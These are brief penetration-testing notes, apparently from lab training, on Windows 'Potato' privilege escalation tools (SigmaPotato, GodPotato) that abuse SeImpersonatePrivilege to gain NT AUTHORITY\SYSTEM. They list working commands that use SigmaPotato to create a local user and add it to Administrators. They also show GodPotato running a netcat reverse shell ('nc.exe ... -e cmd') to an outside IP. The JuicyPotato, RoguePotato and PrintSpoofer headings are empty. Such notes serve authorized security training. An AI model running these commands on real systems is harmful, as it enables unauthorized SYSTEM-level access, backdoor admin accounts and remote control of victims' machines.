# Potato

# SigmaPotato  

- implement variation of POTATO PRIVILEGE ESCALATIONS  
- coerce NT AUTHORITY|SYSTEM -> conn to controller named pipe  
- can use tool when have code exec as user w privilege SeImpersonatePrivilege -> get interactive shell as NT AUTHORITY|SYSTEM  

```  
PS C:\Users\dave> .\SigmaPotato "net user dave4 lab /add"  
PS C:\Users\dave> net user  
  
PS C:\Users\dave> .\SigmaPotato "net localgroup Administrators dave4 /add"  
PS C:\Users\dave> net localgroup Administrators  
``` 
https://github.com/tylerdotrar/SigmaPotato

# GodPotato

https://github.com/BeichenDream/GodPotato/releases/
https://github.com/BeichenDream/GodPotato?tab=readme-ov-file

```
PS C:\users\public> .\gp -cmd "cmd /c whoami"
...
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1364
nt authority\system

PS C:\users\public> .\gp.exe -cmd "C:\Users\public\nc.exe 192.168.45.188 443 -e cmd"
```




# JuicyPotato



# RoguePotato


# PrintSpoofer

